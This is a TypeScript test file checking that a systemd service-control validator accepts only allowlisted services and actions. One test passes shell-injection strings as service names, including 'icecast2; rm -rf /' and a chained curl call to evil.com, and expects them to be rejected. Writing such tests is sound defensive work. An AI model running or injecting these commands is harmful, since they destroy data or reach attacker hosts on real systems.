import { test } from "node:test";
import assert from "node:assert/strict";
import { validateServiceAction, type ServiceName, type ServiceAction } from "./systemd.ts";

test("validateServiceAction accepts all whitelisted combos", () => {
  for (const svc of ["icecast2", "numa-liquidsoap", "cloudflared"] as ServiceName[]) {
    for (const act of ["start", "stop", "restart"] as ServiceAction[]) {
      assert.deepEqual(validateServiceAction(svc, act), { name: svc, action: act });
    }
  }
});

test("validateServiceAction rejects non-allowlisted service names", () => {
  assert.throws(() => validateServiceAction("sshd", "restart"), /invalid service/);
  assert.throws(() => validateServiceAction("", "restart"), /invalid service/);
});

test("validateServiceAction rejects shell-injection attempts in service name", () => {
  assert.throws(() => validateServiceAction("icecast2; rm -rf /", "restart"), /invalid service/);
  assert.throws(() => validateServiceAction("icecast2 && curl evil.com", "restart"), /invalid service/);
});

test("validateServiceAction rejects non-allowlisted actions", () => {
  assert.throws(() => validateServiceAction("icecast2", "destroy"), /invalid action/);
  assert.throws(() => validateServiceAction("icecast2", "enable"), /invalid action/);
  assert.throws(() => validateServiceAction("icecast2", ""), /invalid action/);
});
